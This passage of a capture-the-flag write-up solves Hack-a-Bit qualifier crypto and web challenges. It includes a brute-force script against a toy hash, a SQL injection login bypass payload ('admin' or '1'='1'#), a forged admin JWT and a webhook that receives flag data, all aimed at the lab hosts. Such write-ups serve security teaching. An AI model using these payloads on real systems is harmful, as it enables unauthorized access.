  &lt;img src=&#34;./img/jwtcrack.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;h2 id=&#34;trending-125&#34;&gt;Trending (125)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;All the existing hashing algorithms are dumb, why give me a fixed length? If I give you more input you should give me even more output, its only fair! I wrote a new hashing algorithm that improves on the best of the best (MD5)! Check it out and see if you can break it (you probably can&amp;rsquo;t)!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Here&amp;rsquo;s your hash: &lt;code&gt;b18f21b19e0f86b22d218c86e182214b867b36212576b2617e8c03862d369e&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are given a python file with a custom &amp;lsquo;hashing&amp;rsquo; algorithm.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/python3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; hashlib
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; random
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; string
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# get a five character string to use for randomness (lol)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    one_time_pad_or_something &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;choices(string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;digits, k&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(one_time_pad_or_something)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# itterate over each character in the input&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; index,character &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; enumerate(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# get md5 hash of (that character plus minus pad)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        calculated_character &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; chr(ord(character) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; int(one_time_pad_or_something[index &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;]))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        full_md5_hash &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hashlib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;md5(calculated_character&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# take the first four characters and print them to the screen&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print(full_md5_hash&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hexdigest()[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# new line at end of output&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# verify that we got input in position&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;IndexError&lt;/span&gt;: sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Usage: python3 hashbrown.py &amp;lt;plaintext&amp;gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The OTP (one-time pad) is made of 5 digits, so there are &lt;code&gt;10^5 = 10000&lt;/code&gt; permutations it can be, which is definitely brute force-able.&lt;/p&gt;
&lt;p&gt;Now lets look at the code. It loops over each character of our input (the flag), sets &lt;code&gt;calculated_character&lt;/code&gt; to the flag character, minus a number in the OTP. Then it hashes the character, and outputs the first byte of the hash.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;calculated_character &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; chr(ord(character) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; int(one_time_pad_or_something[index &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;]))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;full_md5_hash &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hashlib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;md5(calculated_character&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(full_md5_hash&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hexdigest()[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This is repeated for every character in the flag.&lt;/p&gt;
&lt;p&gt;Our procedure to recover the flag becomes clear - brute force every OTP, and hash every character the flag could be to recover each flag character.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; hashlib
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; binascii
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; string
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; itertools
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;charset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ascii_lowercase &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;padcharset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;digits
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ct &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b18f21b19e0f86b22d218c86e182214b867b36212576b2617e8c03862d369e&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; itertools&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;product(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0123456789&amp;#34;&lt;/span&gt;, repeat&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    otp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(a)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    flag&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(ct)&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        portion &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ct[i&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:i&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; thing &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; charset:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            calculated_character &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; chr(ord(thing) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; int(otp[i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;]))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            full_md5_hash &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hashlib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;md5(calculated_character&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; full_md5_hash&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hexdigest()[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;portion:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                flag&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt;thing
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; flag:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print(flag, otp)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And we get the flag &lt;code&gt;flag{dont_roll_your_own_crypto}&lt;/code&gt;&lt;/p&gt;

  &lt;img src=&#34;./img/hashbrown.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;h2 id=&#34;powerhouse-150&#34;&gt;Powerhouse (150)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;NON-STANDARD FLAG FORMAT&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Here is an RSA key, sort of; provide p and q as &lt;code&gt;p;q&lt;/code&gt;, like if p was 11 an q was 7, the flag would be &lt;code&gt;11;7&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;N = &lt;code&gt;6176128969&lt;/code&gt; e = &lt;code&gt;1187&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We get a (very unsecure) RSA public key consisting of &lt;code&gt;N&lt;/code&gt; (public modulus) and &lt;code&gt;e&lt;/code&gt; (public exponent).&lt;/p&gt;
&lt;p&gt;But we don&amp;rsquo;t need to worry about any of that. In RSA, &lt;code&gt;N = p * q&lt;/code&gt; where &lt;code&gt;p&lt;/code&gt; and &lt;code&gt;q&lt;/code&gt; are 2 primes. Therefore, we just factor &lt;code&gt;N&lt;/code&gt; to get the flag using &lt;a href=&#34;http://factordb.com/&#34;&gt;factordb&lt;/a&gt;, or any other factoring method (N is very small).&lt;/p&gt;
&lt;p&gt;Flag &lt;code&gt;11329;545161&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;banker-150&#34;&gt;Banker (150)&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;NON-STANDARD FLAG FORMAT&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Crack this pin code. It&amp;rsquo;s between 4-8 characters and all numeric.
&lt;code&gt;320f5cef77246cdce15f9b66e9e4f3ad22f506f9cd28d85e7ccc8839b301e736&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This challenge doesn&amp;rsquo;t give a lot of info. The ciphertext looks like hex, but we get garbage when we try to decode it. However, notice the hex string is 64 bytes long, which is the size for some hashes.&lt;/p&gt;
&lt;p&gt;Putting the hex into &lt;a href=&#34;https://crackstation.net/&#34;&gt;crackstation&lt;/a&gt;, to look up the hash, we find it is the &lt;code&gt;sha256&lt;/code&gt; hash of &lt;code&gt;05593620&lt;/code&gt; and we get the flag.&lt;/p&gt;
&lt;h1 id=&#34;2-web&#34;&gt;2. Web&lt;/h1&gt;
&lt;h2 id=&#34;detective-75&#34;&gt;Detective (75)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Visit the webapp and take a look around, detective: &lt;a href=&#34;https://erpvlnzxrh.qualifier.hackabit.com/detective&#34;&gt;https://erpvlnzxrh.qualifier.hackabit.com/detective&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Viewing the page source we find &lt;code&gt;flag{animated&lt;/code&gt; in the HTML. Going to sources and looking the javascript file we find &lt;code&gt;_commentary_on_&lt;/code&gt;, and going to css we find &lt;code&gt;css}&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This gets us the flag &lt;code&gt;flag{animated_commentary_on_css}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;spectator&#34;&gt;Spectator&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Now how about this one? Maybe just look a little harder&amp;hellip; &lt;a href=&#34;https://erpvlnzxrh.qualifier.hackabit.com/spectator&#34;&gt;https://erpvlnzxrh.qualifier.hackabit.com/spectator&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Going to sources we find &lt;code&gt;flag{there_are_soooooo&lt;/code&gt; in the javascript file (this is also in local storage).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;window.&lt;span style=&#34;color:#a6e22e&#34;&gt;onload&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(){  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    window.&lt;span style=&#34;color:#a6e22e&#34;&gt;localStorage&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setItem&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag_stuff&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag{there_are_soooooo&amp;#34;&lt;/span&gt;)    
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Going to cookies we find &lt;code&gt;flag_stuff&lt;/code&gt; set to &lt;code&gt;_many_ways_to&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Curling the site with extra info (&lt;code&gt;-v&lt;/code&gt;) using &lt;code&gt;curl -v https://erpvlnzxrh.qualifier.hackabit.com/spectator&lt;/code&gt; we get &lt;code&gt;more_flag_stuff: _manage_data}&lt;/code&gt; in the headers, giving us the flag &lt;code&gt;flag{there_are_soooooo_many_ways_to_manage_data}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;nevermind-100&#34;&gt;Nevermind (100)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;If you take something, you gotta put it back, or something at least: &lt;a href=&#34;https://erpvlnzxrh.qualifier.hackabit.com/nevermind&#34;&gt;https://erpvlnzxrh.qualifier.hackabit.com/nevermind&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are presented with a webpage with a image and text saying:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Download this beautiful image and get the MD5 hash of it. Then decide its not that beautiful and POST it back to the same page with header &amp;#34;md5_image_hash&amp;#34; set to that value.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So we download the image, md5 hash it and get &lt;code&gt;021d99868f8b0943b2cf04e944ddab8f&lt;/code&gt; which we post back to the server with the right header using &lt;code&gt;curl -X POST --header &amp;quot;md5_image_hash: 021d99868f8b0943b2cf04e944ddab8f&amp;quot; https://erpvlnzxrh.qualifier.hackabit.com/nevermind&lt;/code&gt; and get the flag: &lt;code&gt;flag{nevermind_not_that_beautiful}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;delegate-100&#34;&gt;Delegate (100)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;When we get code execution by compromising a web application, we generally want to exfiltrate some data. The staff did the hard part and gave you code execution, now just exfil that data! &lt;a href=&#34;https://erpvlnzxrh.qualifier.hackabit.com/delegate&#34;&gt;https://erpvlnzxrh.qualifier.hackabit.com/delegate&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The site includes 2 fields: Epoch and Destination.&lt;/p&gt;
&lt;p&gt;In Epoch we need to put a time, and in destination we can put a URL. After putting the correct epoch (unix time) and a URL, we get the message &lt;code&gt;yup, nice... sent the flag to: https://&amp;lt;the url we provided&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;So let&amp;rsquo;s generate a &lt;a href=&#34;https://webhook.site/&#34;&gt;webhook&lt;/a&gt; to see what it does to the URL we provide it.&lt;/p&gt;
&lt;p&gt;And indeed, it sends us a flag &lt;code&gt;flag{whats_good_mr_mailman}&lt;/code&gt;&lt;/p&gt;

  &lt;img src=&#34;./img/webhook.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;h2 id=&#34;injector-125&#34;&gt;Injector (125)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Someone didn&amp;rsquo;t listen closely in programming class&amp;hellip; yeah it was me I guess, I didn&amp;rsquo;t. Here&amp;rsquo;s a super secure login page, if you can bypass it you might even get a flag&amp;hellip;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://fsiybpfkid.qualifier.hackabit.com/injector&#34;&gt;https://fsiybpfkid.qualifier.hackabit.com/injector&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Injector refers to SQL injection, where unsanitized input can lead to all sorts of security vulnerabilities.&lt;/p&gt;
&lt;p&gt;Searching up a &lt;a href=&#34;https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/&#34;&gt;cheatsheet&lt;/a&gt; we try payload and find this one works &lt;code&gt;admin&#39; or &#39;1&#39;=&#39;1&#39;#&lt;/code&gt;, giving us the flag &lt;code&gt;flag{maveric_pull_the_lever!}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Note that this is basically blind SQL injection as we have minimal info about the server.&lt;/p&gt;

  &lt;img src=&#34;./img/sql.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;h2 id=&#34;brain-125&#34;&gt;Brain (125)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Only admins can get flags&amp;hellip; follow the rules!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://fsiybpfkid.qualifier.hackabit.com/brain&#34;&gt;https://fsiybpfkid.qualifier.hackabit.com/brain&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This was straightforward, but annoying. The page tells us how to get the flag.&lt;/p&gt;

  &lt;img src=&#34;./img/brain.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;There are 4 checks we need to pass to get the flag.&lt;/p&gt;
&lt;p&gt;Setting the header is trivial with &lt;a href=&#34;https://portswigger.net/burp&#34;&gt;burpsuite&lt;/a&gt;, we can intercept our GET request and manually set the header.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s ignore the second one for now. The third one requires us to set a URL parameter, which we can do so by appending &lt;code&gt;?give-me-that-flag=hand-it-over&lt;/code&gt; to the URL.&lt;/p&gt;
&lt;p&gt;For the final one, we check our cookies to find a session cookie &lt;code&gt;&amp;quot;bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOiJmYWxzZSJ9.lq4IQYyT1PxeSQ89DB7pu9i3rPEdPDAQtiSKJSk9VVo&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;It&amp;rsquo;s another JWT! We just head to &lt;a href=&#34;https://jwt.io&#34;&gt;jwt.io&lt;/a&gt; and change &lt;code&gt;admin&lt;/code&gt; to &lt;code&gt;true&lt;/code&gt;, and replace the JWT with the forged one &lt;code&gt;&amp;quot;bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOiJ0cnVlIn0.1zlAeGts8dU1rtt-EB0VcbVwhGA_-UkZIzQQY2u96qs&amp;quot;&lt;/code&gt;. This one doesn&amp;rsquo;t require the JWT to be re-signed.&lt;/p&gt;

